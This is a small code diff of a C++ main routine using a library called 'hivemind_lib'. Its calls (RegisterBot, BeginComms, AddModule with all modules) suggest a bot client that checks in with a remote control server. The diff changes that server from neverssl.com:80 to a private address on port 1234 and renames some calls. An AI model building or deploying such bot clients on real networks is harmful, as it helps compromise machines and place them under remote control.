@@ -3,9 +3,9 @@
 
 int main() {
   hivemind_lib::Init();
-  hivemind_lib::UseTCP();
-  hivemind_lib::InitComms("neverssl.com", "80");
-  hivemind_lib::AddModule(hivemind_lib::All);
+  hivemind_lib::UseTcp();
+  hivemind_lib::InitComms("172.16.100.11", "1234");
+  hivemind_lib::AddModule(hivemind_lib::ALL);
   hivemind_lib::RegisterBot();
   hivemind_lib::BeginComms();
   return 0;
